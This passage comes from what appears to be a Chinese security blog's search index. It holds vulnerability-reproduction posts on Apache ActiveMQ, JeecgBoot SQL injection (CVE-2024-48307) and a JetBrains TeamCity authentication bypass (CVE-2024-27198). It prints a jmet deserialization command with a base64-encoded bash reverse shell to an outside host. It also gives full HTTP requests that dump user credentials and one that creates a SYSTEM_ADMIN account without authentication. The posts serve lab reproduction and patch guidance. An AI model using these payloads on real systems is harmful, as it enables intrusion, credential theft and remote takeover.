plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y &quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjAuMTA3LzQ0NDQgMD4mMQ==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot; -Yp ROME 192.168.244.143 61616<br></code></pre></td></tr></table></figure><p><img src="1724429433956-38043d39-bb6d-4c83-b116-bb59613b2307.png" alt="img"></p><p><img src="1724429481108-f13c8f64-d7bd-4b55-bd92-ffe8801eaca2.png" alt="img"></p><p><img src="1724429576155-2255bc34-283e-4f91-ae04-3fdd0dd80778.png" alt="img"></p><p>成功</p><p><img src="1724429551883-de3e94cc-5450-4e1b-9e54-bdbd8287b168.png" alt="img"></p>]]></content>
    
    
    <categories>
      
      <category>漏洞复现</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Apache</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CVE-2024-48307 JeecgBoot SQL注入漏洞</title>
    <link href="/2025/03/21/jeecgboot-sql/"/>
    <url>/2025/03/21/jeecgboot-sql/</url>
    
    <content type="html"><![CDATA[<h2 id="0x01简介"><a href="#0x01简介" class="headerlink" title="0x01简介"></a>0x01简介</h2><p>北京奥博威斯科技有限公司JeecgBoot是一款基于BPM的低代码平台！前后端分离架构 SpringBoot 2.x&#x2F;3.x，SpringCloud，Ant Design&amp;Vue3，Mybatis-plus，Shiro，JWT，支持微服务。具有代码生成器、权限管理、工作流引擎、监控报警、数据大屏等功能，可以帮助开发人员快速搭建企业级应用系统。</p><h2 id="0x02漏洞概述"><a href="#0x02漏洞概述" class="headerlink" title="0x02漏洞概述"></a>0x02漏洞概述</h2><p>JeecgBoot v3.7.1中的&#x2F;onlDragDatasetHead&#x2F;getTotalData组件发现存在SQL注入漏洞。攻击者可以无权限利用jimureport-dashboard-spring-boot-starter-1.8.1-beta.jar查询数据库，导致数据库信息泄露。</p><h2 id="0x03漏洞版本"><a href="#0x03漏洞版本" class="headerlink" title="0x03漏洞版本"></a>0x03漏洞版本</h2><p>jimureport-spring-boot-starter.version&lt;&#x3D;1.8.1</p><h2 id="0x04环境搭建"><a href="#0x04环境搭建" class="headerlink" title="0x04环境搭建"></a>0x04环境搭建</h2><p><a href="https://github.com/jeecgboot/JeecgBoot/releases">https://github.com/jeecgboot/JeecgBoot/releases</a></p><p>idea部署后端</p><p><img src="1732106805846-82dca018-6752-47d6-af67-c7f5b552fa8e.png" alt="img"></p><p>进入jeecgboot-vue3目录下执行pnpm dev命令开启前端</p><p><img src="1732107074661-4894418d-91dc-4897-8e8d-ac0b54bb803d.png" alt="img"></p><p><img src="1732107655533-e1e05e67-5ea1-49e1-b791-defa4805974c.png" alt="img"></p><h2 id="0x05-漏洞复现"><a href="#0x05-漏洞复现" class="headerlink" title="0x05 漏洞复现"></a>0x05 漏洞复现</h2><p>访问<a href="http://169.254.91.97:8080/jeecg-boot/drag/onlDragDatasetHead/getTotalData%E5%8F%AF%E4%BB%A5%E5%8F%91%E7%8E%B0%E6%9C%8D%E5%8A%A1%E5%8F%AF%E7%94%A8%EF%BC%8C%E4%B8%8D%E8%83%BD%E4%BB%A5get%E6%96%B9%E5%BC%8F%E8%AE%BF%E9%97%AE">http://169.254.91.97:8080/jeecg-boot/drag/onlDragDatasetHead/getTotalData可以发现服务可用，不能以get方式访问</a></p><p><img src="1732445544141-2f266985-dd4d-4ee1-a2a1-9d41cd628475.png" alt="img"></p><p>根据源码构建json数据，尝试访问sys_user表的id</p><p><img src="1732463712303-03ae9231-2a93-4871-bc62-ffd214091dce.png" alt="img"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs plain">POST /jeecg-boot/drag/onlDragDatasetHead/getTotalData HTTP/1.1<br>Host: 169.254.91.97:8080<br>User-Agent: python-requests/2.31.0<br>Accept-Encoding: gzip, deflate, br<br>Accept: */*<br>Connection: close<br>Content-Length: 296<br>Content-Type: application/json<br><br>&#123;&quot;tableName&quot;: &quot;sys_user&quot;, &quot;compName&quot;: &quot;test&quot;, &quot;condition&quot;: &#123;&quot;filter&quot;: &#123;&#125;&#125;, &quot;config&quot;: &#123;&quot;assistValue&quot;: [], &quot;assistType&quot;: [], &quot;name&quot;: [&#123;&quot;fieldName&quot;: &quot;concat(id)&quot;, &quot;fieldType&quot;: &quot;string&quot;&#125;, &#123;&quot;fieldName&quot;: &quot;id&quot;, &quot;fieldType&quot;: &quot;string&quot;&#125;], &quot;value&quot;: [&#123;&quot;fieldName&quot;: &quot;id&quot;, &quot;fieldType&quot;: &quot;string&quot;&#125;], &quot;type&quot;: []&#125;&#125;<br></code></pre></td></tr></table></figure><p><img src="1732453915914-b111c9bc-5a5f-4293-97ac-17668860d9cf.png" alt="img"></p><p>查询username和password</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs plain">POST /jeecg-boot/drag/onlDragDatasetHead/getTotalData HTTP/1.1<br>Host: 169.254.91.97:8080<br>User-Agent: python-requests/2.31.0<br>Accept-Encoding: gzip, deflate, br<br>Accept: */*<br>Connection: close<br>Content-Type: application/json<br>Content-Length: 311<br><br>&#123;&quot;tableName&quot;: &quot;sys_user&quot;, &quot;compName&quot;: &quot;test&quot;, &quot;condition&quot;: &#123;&quot;filter&quot;: &#123;&#125;&#125;, &quot;config&quot;: &#123;&quot;assistValue&quot;: [], &quot;assistType&quot;: [], &quot;name&quot;: [&#123;&quot;fieldName&quot;: &quot;concat(username,0x3a,password)&quot;, &quot;fieldType&quot;: &quot;string&quot;&#125;, &#123;&quot;fieldName&quot;: &quot;id&quot;, &quot;fieldType&quot;: &quot;string&quot;&#125;], &quot;value&quot;: [&#123;&quot;fieldName&quot;: &quot;id&quot;, &quot;fieldType&quot;: &quot;1&quot;&#125;], &quot;type&quot;: []&#125;&#125;<br></code></pre></td></tr></table></figure><p><img src="1732109838659-680cdcf4-7859-404b-a293-3d9cfdee1316.png" alt="img"></p><h2 id="0x06-修复方式"><a href="#0x06-修复方式" class="headerlink" title="0x06 修复方式"></a>0x06 修复方式</h2><p>更新插件jimureport到1.9.1</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://help.jeecg.com/setup/startup.html">https://help.jeecg.com/setup/startup.html</a></p>]]></content>
    
    
    <categories>
      
      <category>漏洞复现</category>
      
    </categories>
    
    
    <tags>
      
      <tag>jeecgboot</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CVE-2024-27198 JetBrains TeamCity身份验证绕过漏洞分析</title>
    <link href="/2024/03/22/CVE-2024-27198-JetBrains-TeamCity-%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    <url>/2024/03/22/CVE-2024-27198-JetBrains-TeamCity-%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</url>
    
    <content type="html"><![CDATA[<p>简介</p><p>JetBrains TeamCity是一款由JetBrains公司开发的持续集成和持续部署（CI&#x2F;CD）服务器。TeamCity旨在帮助开发人员和团队自动化软件开发过程中的重复任务，提高构建、测试和部署的速度和效率。TeamCity可以支持多种编程语言和技术，也能与许多开发工具和系统集成。</p><p>漏洞概述</p><p>JetBrains TeamCity在2023.11.4以往的版本中，由于只进行了不为空、jsp后缀名和限制admin目录，造成可通过;进行后缀名的忽略，导致路劲遍历，访问&#x2F;app&#x2F;rest&#x2F;users，提交相关信息可实现身份绕过。</p><p>影响版本</p><p>TeamCity（On-Premises）&lt; 2023.11.4</p><p>环境搭建</p><p><a href="https://www.jetbrains.com/teamcity/download/other.html">Other Versions - TeamCity (jetbrains.com)</a></p><p>下载2023.11.3的windows版，本地安装以及合适的java版本</p><p><img src="image-20240314171519556-17117163054031-17117167453411-17117189613501-1742632700336-1.png" alt="image-20240314171519556"></p><p>漏洞利用</p><p>poc</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/xxx?jsp=/app/rest/users;.jsp</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>192.168.31.161:8111<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>*/*<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/json<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>124<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><br><span class="language-prolog">&#123;<span class="hljs-string">&quot;username&quot;</span>: <span class="hljs-string">&quot;test666&quot;</span>, <span class="hljs-string">&quot;password&quot;</span>: <span class="hljs-string">&quot;test666&quot;</span>, <span class="hljs-string">&quot;email&quot;</span>: <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;roles&quot;</span>: &#123;<span class="hljs-string">&quot;role&quot;</span>: [&#123;<span class="hljs-string">&quot;roleId&quot;</span>: <span class="hljs-string">&quot;SYSTEM_ADMIN&quot;</span>, <span class="hljs-string">&quot;scope&quot;</span>: <span class="hljs-string">&quot;g&quot;</span>&#125;]&#125;&#125;</span><br></code></pre></td></tr></table></figure><p>向&#x2F;app&#x2F;rest&#x2F;user添加用户</p><p><img src="image-20240314171828219-17117163054042-17117189613502-1742632700336-2.png" alt="image-20240314171828219"></p><p>漏洞分析</p><p>在2023.11.3版本中webapps\ROOT\WEB-INF\lib\web-openapi.jar  反编译得到源码。</p><p>在jetbrains.buildServer.controllers.BaseController观察handleRequestInternal方法</p><p><img src="image-20240314172839190-17117163054043-17117189613504-1742632700337-3.png" alt="image-20240314172839190"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> ModelAndView <span class="hljs-title function_">handleRequestInternal</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-comment">// 调用子类实现的doHandle方法处理请求，并将结果赋值给modelAndView对象</span><br>        <span class="hljs-type">ModelAndView</span> <span class="hljs-variable">modelAndView</span> <span class="hljs-operator">=</span> doHandle(request, response);<br>        <span class="hljs-comment">// 检查modelAndView对象是否不为null  </span><br>        <span class="hljs-keyword">if</span> (modelAndView != <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-comment">// 检查modelAndView的视图是否为RedirectView类型</span><br>            <span class="hljs-keyword">if</span> (modelAndView.getView() <span class="hljs-keyword">instanceof</span> RedirectView) &#123;<br>                <span class="hljs-comment">// 如果是，清空模型中的数据</span><br>                modelAndView.getModel().clear();<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-comment">// 如果不是，可能需要根据请求中JSP的参数更新视图</span><br>                updateViewIfRequestHasJspParameter(request, modelAndView);<br>            &#125;<br>        &#125;<br></code></pre></td></tr></table></figure><p>跟入updateViewIfRequestHasJspParameter</p><p><img src="image-20240314175141541-17117163054044-17117189613505-1742632700337-4.png" alt="image-20240314175141541"></p><p>关键代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java">modelAndView.getViewName() != <span class="hljs-literal">null</span>：<br><span class="hljs-comment">//检查ModelAndView对象是否有一个view名称。这是合理的，因为如果没有view名称，那么就没有指定的视图来渲染响应。</span><br><br>!request.getServletPath().endsWith(<span class="hljs-string">&quot;.jsp&quot;</span>)：<br> <span class="hljs-comment">//这个逻辑是为了确保请求的路径不是直接指向JSP文件。这可能是用于阻止直接访问JSP页面，确保请求必须通过控制器。boolean isControllerRequestWithViewName = (modelAndView.getViewName() != null &amp;&amp; !request.getServletPath().endsWith(&quot;.jsp&quot;));</span><br></code></pre></td></tr></table></figure><p>直接的来说是不能请求jsp文件</p><p><img src="image-20240314181106564-17117163054045-17117189613503-1742632700337-5.png" alt="image-20240314181106564"></p><p>接下来来看getJspFromRequest</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">protected</span> String <span class="hljs-title function_">getJspFromRequest</span><span class="hljs-params">(<span class="hljs-meta">@NotNull</span> HttpServletRequest request)</span> &#123;<br>  <span class="hljs-type">String</span> <span class="hljs-variable">jspFromRequest</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">&quot;jsp&quot;</span>);  <span class="hljs-comment">//获取名为&quot;jsp&quot;的参数值</span><br>  <span class="hljs-keyword">if</span> (jspFromRequest != <span class="hljs-literal">null</span> &amp;&amp; (!jspFromRequest.endsWith(<span class="hljs-string">&quot;.jsp&quot;</span>) || jspFromRequest.contains(<span class="hljs-string">&quot;admin/&quot;</span>))) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>  &#125;<br>   <span class="hljs-keyword">return</span> jspFromRequest;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="image-20240314184828400-17117163054056-17117189613506-1742632700337-6.png" alt="image-20240314184828400"></p><p>\webapps\ROOT\WEB-INF\web.xml</p><p><img src="image-20240327203731079-17117163054057-17117189613507-1742632700337-7.png" alt="image-20240327203731079"></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">servlet-mapping</span>&gt;</span>：这个标签开始了一个 servlet 映射的定义。<br><span class="hljs-tag">&lt;<span class="hljs-name">servlet-name</span>&gt;</span>buildServer<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-name</span>&gt;</span>：这指定了 servlet 映射到的 servlet 的名称，这个名称应该与web.xml文件中的一个<span class="hljs-tag">&lt;<span class="hljs-name">servlet</span>&gt;</span>标签中定义的servlet-name子标签的内容相匹配。<br><span class="hljs-tag">&lt;<span class="hljs-name">url-pattern</span>&gt;</span>/app/*<span class="hljs-tag">&lt;/<span class="hljs-name">url-pattern</span>&gt;</span>：这定义了 servlet 的 URL 模式。/app/*意味着任何以/app/开头的URL都将由名为buildServer的 servlet 处理。<br><span class="hljs-tag">&lt;/<span class="hljs-name">servlet-mapping</span>&gt;</span>：结束 servlet 映射的定义。<br></code></pre></td></tr></table></figure><p>在webapps\ROOT\WEB-INF\buildServerSpringWeb.xml</p><p>为什么是&#x2F;rest&#x2F;</p><p>意味着对于应用中所有以 <code>/res/</code> 开头的资源请求，都会通过引用的 <code>pageResourceCompressor</code> bean 来进行处理。</p><p><img src="image-20240329203259909-17117163054058-17117189613508-1742632700337-8.png" alt="image-20240329203259909"></p><p>为什么是users</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java">*/   <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">PlaceId</span> <span class="hljs-variable">ADMIN_USER_MANAGEMENT_TAB</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PlaceId</span>(<span class="hljs-string">&quot;ADMIN_USER_MANAGEMENT@TAB&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">PathBasedExtensionAvailability</span>(<span class="hljs-string">&quot;/admin/admin.html&quot;</span>)<br><span class="hljs-comment">/*     */</span>       &#123;<br><span class="hljs-comment">/*     */</span>         <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">isAvailable</span><span class="hljs-params">(<span class="hljs-meta">@NotNull</span> HttpServletRequest request)</span> &#123;<br><span class="hljs-comment">/* 250 */</span>           <span class="hljs-keyword">return</span> (<span class="hljs-built_in">super</span>.isAvailable(request) &amp;&amp; <span class="hljs-string">&quot;users&quot;</span>.equalsIgnoreCase(request.getParameter(<span class="hljs-string">&quot;item&quot;</span>)));<br><span class="hljs-comment">/*     */</span>         &#125;<br><span class="hljs-comment">/*     */</span>       &#125;);<br><span class="hljs-comment">/*     */</span><br></code></pre></td></tr></table></figure><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">为了满足这段代码中的isAvailable方法的条件，一个HTTP请求需要同时符合以下两个标准：<br><br>超类PathBasedExtensionAvailability的isAvailable方法必须返回<span class="hljs-literal">true</span>。这通常意味着请求的<span class="hljs-built_in">URL</span>路径必须和所提供的路径/admin/admin.html相匹配。<br><br>请求必须包含一个名为<span class="hljs-keyword">item</span>的参数，其值不区分大小写地等于<span class="hljs-string">&quot;users&quot;</span>。<br><br>假设super.isAvailable(request)确实是对请求的<span class="hljs-built_in">URL</span>进行检查，则一个典型的请求<span class="hljs-built_in">URL</span>可能如下所示：<br><br><span class="hljs-keyword">https</span>://www.example.com/admin/admin.html?<span class="hljs-keyword">item</span>=users<br>在这个示例<span class="hljs-built_in">URL</span>中：<br><br><span class="hljs-keyword">https</span>://www.example.com 是服务器的地址。<br>/admin/admin.html 是请求的路径，与PathBasedExtensionAvailability中定义的路径相匹配。<br>?<span class="hljs-keyword">item</span>=users 是查询字符串，其中包含一个参数<span class="hljs-keyword">item</span>，它的值为users。<br>这样的请求会导致isAvailable方法返回<span class="hljs-literal">true</span>，因为它满足了方法中的两个条件：路径匹配，并且有一个正确的<span class="hljs-keyword">item</span>参数值。<br></code></pre></td></tr></table></figure><p>也可以通过</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">GET</span> /xxx?jsp=/app/rest/server;.jsp HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span><br><span class="hljs-attribute">Host</span>: you-ip:<span class="hljs-number">8111</span><br><span class="hljs-attribute">User</span>-Agent: Mozilla/<span class="hljs-number">5</span>.<span class="hljs-number">0</span> (Windows NT <span class="hljs-number">10</span>.<span class="hljs-number">0</span>; Win64; x64; rv:<span class="hljs-number">124</span>.<span class="hljs-number">0</span>) Gecko/<span class="hljs-number">20100101</span> Firefox/<span class="hljs-number">124</span>.<span class="hljs-number">0</span><br><span class="hljs-attribute">Accept</span>: text/javascript, text/html, application/xml, text/xml, */*<br><span class="hljs-attribute">Accept</span>-Language: zh-CN,zh;q=<span class="hljs-number">0</span>.<span class="hljs-number">8</span>,zh-TW;q=<span class="hljs-number">0</span>.<span class="hljs-number">7</span>,zh-HK;q=<span class="hljs-number">0</span>.<span class="hljs-number">5</span>,en-US;q=<span class="hljs-number">0</span>.<span class="hljs-number">3</span>,en;q=<span class="hljs-number">0</span>.<span class="hljs-number">2</span><br><span class="hljs-attribute">Accept</span>-Encoding: gzip, deflate, br<br><span class="hljs-attribute">Referer</span>: you-ip:<span class="hljs-number">8111</span>/login.html<br><span class="hljs-attribute">X</span>-Requested-With: XMLHttpRequest<br><span class="hljs-attribute">X</span>-TeamCity-Client: AJAX-Prototype<br><span class="hljs-attribute">X</span>-Prototype-Version: <span class="hljs-number">1</span>.<span class="hljs-number">7</span>.<span class="hljs-number">3</span><br><span class="hljs-attribute">X</span>-TC-CSRF-Token: a3d4faac-<span class="hljs-number">5</span>d1b-<span class="hljs-number">45</span>ae-bd51-<span class="hljs-number">97421128439</span>d<br></code></pre></td></tr></table></figure><p>去查看开放的api端口服务</p><p><img src="image-20240329204158156-17117161204111-17117163054059-17117189613509-1742632700337-9.png" alt="image-20240329204158156"></p><p>条件有四个：</p><ul><li><p>路径和参数不为空；</p></li><li><p>不能包含admin的路径</p></li><li><p>不能请求.jsp文件</p></li><li><p>请求接口以.jsp为后缀</p></li></ul><p>poc分析</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/xxx?jsp=/app/rest/users;.jsp</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>192.168.31.161:8111<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>*/*<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/json<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>124<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><br><span class="language-prolog">&#123;<span class="hljs-string">&quot;username&quot;</span>: <span class="hljs-string">&quot;test666&quot;</span>, <span class="hljs-string">&quot;password&quot;</span>: <span class="hljs-string">&quot;test666&quot;</span>, <span class="hljs-string">&quot;email&quot;</span>: <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;roles&quot;</span>: &#123;<span class="hljs-string">&quot;role&quot;</span>: [&#123;<span class="hljs-string">&quot;roleId&quot;</span>: <span class="hljs-string">&quot;SYSTEM_ADMIN&quot;</span>, <span class="hljs-string">&quot;scope&quot;</span>: <span class="hljs-string">&quot;g&quot;</span>&#125;]&#125;&#125;</span><br></code></pre></td></tr></table></figure><p>&#x2F;xxx   ：中xxx可以为除admin以外的值，绕过重定向</p><p>?jsp&#x3D; ：填写访问接口</p><p>;.jsp   ：在URL中，分号（;）通常用于表示一组参数的结束。以此来过滤.jsp</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs prolog">&#123;<span class="hljs-string">&quot;username&quot;</span>: <span class="hljs-string">&quot;test666&quot;</span>, <span class="hljs-string">&quot;password&quot;</span>: <span class="hljs-string">&quot;test666&quot;</span>, <span class="hljs-string">&quot;email&quot;</span>: <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;roles&quot;</span>: &#123;<span class="hljs-string">&quot;role&quot;</span>: [&#123;<span class="hljs-string">&quot;roleId&quot;</span>: <span class="hljs-string">&quot;SYSTEM_ADMIN&quot;</span>, <span class="hljs-string">&quot;scope&quot;</span>: <span class="hljs-string">&quot;g&quot;</span>&#125;]&#125;&#125;<br></code></pre></td></tr></table></figure><p>提交创建用户信息</p><p>修复方式：</p><p>升级到2023.11.4及以上的版本</p>]]></content>
    
    
    <categories>
      
      <category>漏洞复现</category>
      
    </categories>
    
    
    <tags>
      
      <tag>JetBrains</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
